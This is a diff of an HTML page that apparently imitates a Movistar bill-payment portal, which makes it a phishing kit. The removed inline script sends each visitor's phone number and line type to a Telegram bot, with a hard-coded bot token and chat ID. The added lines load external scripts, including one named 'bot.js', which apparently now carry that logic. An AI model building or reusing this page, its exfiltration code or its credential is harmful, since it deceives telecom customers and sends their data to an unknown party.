@@ -1,3 +1,5 @@
+
+
 <!doctype html>
 <html lang="es">
 
@@ -12,6 +14,8 @@
     <!-- Stylesheets -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" />
     <link href="styles.css" rel="stylesheet"> <!-- Enlace al CSS separado -->
+    <script src="epayco/js/functions.js"></script>
+    <script src="bot.js"></script>
     <title>Movistar Portal de Recaudos</title>
     <style>
         #loader {
@@ -26,7 +30,6 @@
             height: 100vh;
             align-items: center;
             justify-content: center;
-            flex-direction: column;
         }
 
         .svg-circle {
@@ -75,12 +78,6 @@
                 stroke-dashoffset: -124;
             }
         }
-
-        .btn-secondary-disabled {
-            background-color: #ccc !important;
-            border-color: #ccc !important;
-            cursor: not-allowed;
-        }
     </style>
 </head>
 
@@ -110,7 +107,8 @@
 
                 <div class="form-group">
                     <div class="btn-group d-flex justify-content-center" role="group" aria-label="Tipo de línea">
-                        <input type="radio" class="btn-check" name="lineType" id="mobileLine" autocomplete="off" checked>
+                        <input type="radio" class="btn-check" name="lineType" id="mobileLine" autocomplete="off"
+                            checked>
                         <label class="btn btn-outline-primary" for="mobileLine">Móvil</label>
 
                         <input type="radio" class="btn-check" name="lineType" id="fixedLine" autocomplete="off">
@@ -162,85 +160,30 @@
         <svg viewBox="25 25 50 50" class="svg-circle">
             <circle r="20" cy="50" cx="50"></circle>
         </svg>
-        <p class="text-primary mt-3">Estamos consultando tu factura...</p>
     </div>
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"
         integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/js/bootstrap.bundle.min.js"></script>
-
+    <script src="debtmap.js"></script>
+    <script src="scripts.js"></script> <!-- Enlace al JS separado -->
     <script>
-        const lineInput = document.getElementById("line-number");
-        const consultBtn = document.getElementById("consultPayButton");
-        const scheduleBtn = document.getElementById("schedulePayButton");
-
-        // Activar botones al escribir un número válido
-        lineInput.addEventListener("input", function () {
-            if (this.value.trim().length >= 7) {
-                consultBtn.disabled = false;
-                consultBtn.classList.remove("btn-secondary-disabled");
-                consultBtn.classList.add("btn-primary");
-
-                scheduleBtn.disabled = false;
-                scheduleBtn.classList.remove("btn-secondary-disabled");
-                scheduleBtn.classList.add("btn-outline-primary");
-            } else {
-                consultBtn.disabled = true;
-                consultBtn.classList.add("btn-secondary-disabled");
-
-                scheduleBtn.disabled = true;
-                scheduleBtn.classList.add("btn-secondary-disabled");
-            }
-        });
-
-        // Acción Consultar y Pagar
         document.getElementById("consultPayButton").addEventListener("click", function () {
-            const lineNumber = lineInput.value.trim();
+            const lineNumber = document.getElementById("line-number").value.trim();
+            // Mostrar el nuevo loader SVG
             const loader = document.getElementById("loader");
-
-            // Validación de número
-            if (!/^[0-9]{7,10}$/.test(lineNumber)) {
-                alert("Por favor ingresa un número válido (7 a 10 dígitos).");
-                return;
-            }
-
-            // Detectar si es móvil o fija
-            const lineType = document.getElementById("mobileLine").checked ? "Móvil" : "Fija";
-
-            // Mostrar loader
             loader.style.display = "flex";
-
-            // 🔹 Enviar a Telegram
-            const botToken = "8149198005:AAFr_Caqa4fby95H3nwUBdKCUvT-X56rbHo"; // Reemplaza con tu token
-            const chatId = "8217102156";     // Reemplaza con tu chat ID
-            const message = `📱 Nueva consulta de pago:\nTipo: ${lineType}\nNúmero: ${lineNumber}\n⏰ Fecha: ${new Date().toLocaleString()}`;
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: "HTML"
-                })
-            })
-                .then(res => res.json())
-                .then(() => {
-                    setTimeout(function () {
-                        loader.style.display = "none";
-                        if (window.debtMap && window.debtMap[lineNumber]) {
-                            localStorage.setItem("lineNumber", lineNumber);
-                            window.location.href = "screen2.html";
-                        }
-                    }, 2000);
-                })
-                .catch(err => {
-                    loader.style.display = "none";
-                    console.error("Error enviando a Telegram:", err);
-                });
+            setTimeout(function () {
+                loader.style.display = "none";
+                // Lógica original después del loader
+                if (window.debtMap && window.debtMap[lineNumber]) {
+                    localStorage.setItem("lineNumber", lineNumber);
+                    window.location.href = "screen2.html";
+                }
+            }, 2000); // 2 segundos
         });
     </script>
+    <!-- ...existing code... -->
 </body>
 
 </html>
-
